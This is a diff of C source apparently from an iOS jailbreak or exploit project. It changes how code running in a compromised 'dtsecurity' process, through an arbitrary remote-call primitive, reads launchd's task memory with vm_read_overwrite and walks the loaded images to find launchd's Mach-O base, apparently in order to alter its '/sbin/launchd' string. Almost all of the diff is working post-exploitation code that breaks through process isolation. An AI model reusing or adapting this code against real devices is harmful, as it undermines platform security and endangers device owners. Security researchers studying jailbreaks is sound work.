@@ -151,8 +151,8 @@ vm_offset_t findSbinLaunchdOff(void) {
         kern_return_t kr;
         
         // Create a region which holds temp data (should we use stack instead?)
-        vm_size_t shared_size = getpagesize();
-        vm_address_t map = RemoteArbCall(mmap, 0, shared_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+        vm_size_t page_size = getpagesize();
+        vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
         if (!map) {
             printf("Failed to call mmap. Please try resetting pointer and try again\n");
             return;
@@ -172,7 +172,7 @@ vm_offset_t findSbinLaunchdOff(void) {
 //        }
 //        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
         // Map the page we allocated in dtsecurity to this process
-//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, shared_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
+//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
 //        if (kr != KERN_SUCCESS) {
 //            printf("Failed to create dtsecurity<->haxx shared mapping\n");
 //            return;
@@ -224,14 +224,31 @@ vm_offset_t findSbinLaunchdOff(void) {
             return;
         }
         
-        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, RemoteRead64(map), sizeof(uint64_t), map, map + 8);
-        if (kr != KERN_SUCCESS) {
-            printf("vm_read_overwrite infoArray[0] failed\n");
-            return;
+        // Enumerate images to find launchd base
+        vm_address_t launchd_base = 0;
+        vm_address_t infoArray = RemoteRead64(map);
+        for (int i = 0; i < 10; i++) {
+            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
+            uint64_t base = RemoteRead64(map);
+            if (base % page_size) {
+                // skip unaligned entries, as they are likely in dsc
+                continue;
+            }
+            printf("Image[%d] = 0x%llx\n", i, base);
+            // read magic, cputype, cpusubtype, filetype
+            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
+            uint64_t magic = RemoteRead32(map);
+            if (magic != MH_MAGIC_64) {
+                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
+                continue;
+            }
+            uint32_t filetype = RemoteRead32(map + 12);
+            if (filetype == MH_EXECUTE) {
+                printf("found launchd executable at 0x%llx\n", base);
+                launchd_base = base;
+                break;
+            }
         }
-        
-        vm_address_t launchd_base = RemoteRead64(map);
-        printf("Found main executable base: 0x%lx\n", launchd_base);
         
         // Reprotect rw
         vm_offset_t launchd_str_off = findSbinLaunchdOff();
